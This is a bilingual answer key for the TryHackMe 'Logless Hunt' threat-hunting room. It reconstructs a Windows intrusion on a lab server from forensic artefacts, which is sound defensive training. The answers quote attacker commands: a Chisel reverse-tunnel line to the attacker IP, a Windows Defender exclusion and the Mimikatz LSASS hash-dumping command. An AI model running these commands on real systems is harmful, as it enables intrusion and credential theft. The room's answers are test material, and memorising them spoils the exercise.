# Logless Hunt

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF (Free) | loglesshunt | https://tryhackme.com/room/loglesshunt | SOC / Detection | Writeup de thmrevenant (GitHub) | Windows logs, Web Shell, Chisel, RDP tunnel, Scheduled Tasks, Mimikatz, Defender | Threat hunting en Windows sin logs tradicionales |

---

**Contexto:** **Logless Hunt** es una cacería de amenazas en un entorno Windows sin depender de los logs tradicionales: se investigan tráfico de red, procesos, tareas programadas y artefactos de seguridad para reconstruir un ataque completo. El escenario parte de una aplicación web vulnerable (Salary Raise Approver), sigue con una web shell, un túnel RDP con Chisel, persistencia vía tarea programada y culmina con la extracción de hashes con Mimikatz.

> **ES:** Cacería de amenazas en un entorno Windows sin depender de logs tradicionales, investigando tráfico de red, procesos, tareas programadas y artefactos de seguridad para reconstruir un ataque completo.
> **EN:** Threat hunting in a Windows environment without relying on traditional logs, investigating network traffic, processes, scheduled tasks, and security artifacts to reconstruct a full attack.

## Solucionario

### Task 1 / Tarea 1 — Reconocimiento e Inicial Access
**Explicación:**

Se revisan los Security logs para fijar la línea de tiempo, se identifica la app web en el puerto 80, se localiza la IP que realizó un escaneo extensivo, se rastrea la web shell subida y los primeros comandos del atacante.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the earliest Event ID you see in the Security logs? | `1102` |
| What is the title of the HR01-SRV web app hosted on 80 port? | `Salary Raise Approver v0.1` |
| Which IP performed an extensive web scan on the HR01-SRV web app? | `10.10.23.190` |
| What is the absolute path to the file that the suspicious IP uploaded? | `C:\Apache24\htdocs\uploads\search.php` |
| Clearly, that's suspicious! What would you call the uploaded malware / backdoor? | `Web Shell` |
| What was the first command entered by the attacker? | `whoami` |
| What is the full URL of the file that the attacker attempted to download? | `http://10.10.23.190:8080/httpd-proxy.exe` |

### Task 2 / Tarea 2 — Execution, Persistence y Lateral Movement
**Explicación:**

Se analiza la ejecución posterior: exclusión de Windows Defender, el túnel RDP con el binario cargado (Chisel), los logins RDP sospechosos del atacante y la persistencia mediante la tarea programada "Apache Proxy".

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What command was run to exclude the file from Windows Defender? | `Add-MpPreference -ExclusionPath C:\Apache24` |
| Which remote access service was tunnelled using the uploaded binary? | `RDP` |
| What is the timestamp of the first suspicious RDP login? | `2025-01-23 17:00:12` |
| What user did the attacker breach? | `HR01-SRV\Administrator` |
| What IP is shown as the source of the RDP login? | `10.10.23.190` |
| What is the timestamp when the attacker disconnected from RDP? | `2025-01-23 17:16:46` |
| What is the name of the suspicious scheduled task? | `Apache Proxy` |
| When was the suspicious scheduled task created? | `2025-01-23 17:05:37` |
| What is the task's "Trigger" value as shown in Task Scheduler GUI? | `At system startup` |
| What is the full command line of the malicious task? | `C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389` |

### Task 3 / Tarea 3 — Collection y Exfiltration
**Explicación:**

Se examinan los artefactos de recolección y exfiltración: los archivos cuarentenados por Defender (Chisel y Mimikatz), el ejecutable de Mimikatz descargado y el comando usado para extraer hashes de la memoria de LSASS.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the threat family ("Name") of the first quarantined file? | `VirTool:Win64/Chisel.G` |
| And what is the threat family of the next detected malware? | `HackTool:Win32/Mimikatz!pz` |
| What is the file name of the downloaded Mimikatz executable? | `mimi.exe` |
| Finally, which Mimikatz command was used to extract hashes from LSASS memory? | `lsadump::lsa /inject` |

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1.1 | What is the earliest Event ID you see in the Security logs? | `1102` |
| 1.2 | What is the title of the HR01-SRV web app hosted on 80 port? | `Salary Raise Approver v0.1` |
| 1.3 | Which IP performed an extensive web scan on the HR01-SRV web app? | `10.10.23.190` |
| 1.4 | What is the absolute path to the file that the suspicious IP uploaded? | `C:\Apache24\htdocs\uploads\search.php` |
| 1.5 | Clearly, that's suspicious! What would you call the uploaded malware / backdoor? | `Web Shell` |
| 1.6 | What was the first command entered by the attacker? | `whoami` |
| 1.7 | What is the full URL of the file that the attacker attempted to download? | `http://10.10.23.190:8080/httpd-proxy.exe` |
| 2.1 | What command was run to exclude the file from Windows Defender? | `Add-MpPreference -ExclusionPath C:\Apache24` |
| 2.2 | Which remote access service was tunnelled using the uploaded binary? | `RDP` |
| 2.3 | What is the timestamp of the first suspicious RDP login? | `2025-01-23 17:00:12` |
| 2.4 | What user did the attacker breach? | `HR01-SRV\Administrator` |
| 2.5 | What IP is shown as the source of the RDP login? | `10.10.23.190` |
| 2.6 | What is the timestamp when the attacker disconnected from RDP? | `2025-01-23 17:16:46` |
| 2.7 | What is the name of the suspicious scheduled task? | `Apache Proxy` |
| 2.8 | When was the suspicious scheduled task created? | `2025-01-23 17:05:37` |
| 2.9 | What is the task's "Trigger" value as shown in Task Scheduler GUI? | `At system startup` |
| 2.10 | What is the full command line of the malicious task? | `C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389` |
| 3.1 | What is the threat family ("Name") of the first quarantined file? | `VirTool:Win64/Chisel.G` |
| 3.2 | And what is the threat family of the next detected malware? | `HackTool:Win32/Mimikatz!pz` |
| 3.3 | What is the file name of the downloaded Mimikatz executable? | `mimi.exe` |
| 3.4 | Finally, which Mimikatz command was used to extract hashes from LSASS memory? | `lsadump::lsa /inject` |

---

## Metodología / Methodology

1. **Paso / Step:** Revisar los Security logs para identificar el Event ID más antiguo y establecer la línea de tiempo / Review Security logs to identify the earliest Event ID and establish the timeline.
2. **Paso / Step:** Investigar la aplicación web en el puerto 80 y escanear para identificar la IP atacante / Investigate the web application on port 80 and scan to identify the attacker IP.
3. **Paso / Step:** Rastrear archivos subidos por el atacante y confirmar la presencia de una web shell / Track files uploaded by the attacker and confirm the presence of a web shell.
4. **Paso / Step:** Analizar comandos ejecutados a través de la web shell y archivos descargados / Analyze commands executed through the web shell and downloaded files.
5. **Paso / Step:** Identificar exclusión de Windows Defender, túnel de RDP con Chisel y tareas programadas para persistencia / Identify Windows Defender exclusion, RDP tunneling with Chisel, and scheduled tasks for persistence.
6. **Paso / Step:** Examinar artefactos de Mimikatz y comandos de extracción de hashes / Examine Mimikatz artifacts and hash extraction commands.

### Cadena de ataque / Attack Chain

```
Escaneo web desde 10.10.23.190 contra HR01-SRV (Salary Raise Approver)
  -> Subida de web shell (search.php) en directorio de uploads
    -> Ejecución de whoami y descarga de httpd-proxy.exe (Chisel)
      -> Exclusión de Windows Defender: Add-MpPreference -ExclusionPath C:\Apache24
        -> Túnel RDP mediante Chisel (puerto 10443 -> 3389)
          -> Login RDP como HR01-SRV\Administrator
            -> Persistencia: tarea programada "Apache Proxy" (At system startup)
              -> Descarga y ejecución de Mimikatz (mimi.exe)
                -> Extracción de hashes: lsadump::lsa /inject
```

**Learning chain:** Riesgo inicial (web app expuesta) → reconocimiento (Security logs, escaneo web) → initial access (web shell) → execution (descarga de herramientas) → persistence (Defender exclusion, scheduled task) → lateral movement (RDP tunnel con Chisel) → collection (Mimikatz sobre LSASS) → exfiltration.

**Lección:** *La cacería de amenazas sin logs tradicionales requiere correlacionar múltiples artefactos de Windows (eventos de seguridad, tareas programadas, exclusiones de Defender, procesos en memoria) para reconstruir la cadena de ataque completa. Las herramientas como Chisel y Mimikatz son indicadores clave de compromiso.*

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · T1505.003 Web Shell · T1562.001 Impair Defenses (exclusión Defender) · T1572 Protocol Tunneling (Chisel) · T1078 Valid Accounts · T1053.005 Scheduled Task · T1003.001 LSASS Memory (Mimikatz) · T1041 Exfiltration Over C2 Channel.

**Fuente:** [TryHackMe - Logless Hunt](https://tryhackme.com/room/loglesshunt)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos. **Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe. **Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto. **Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com). **Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.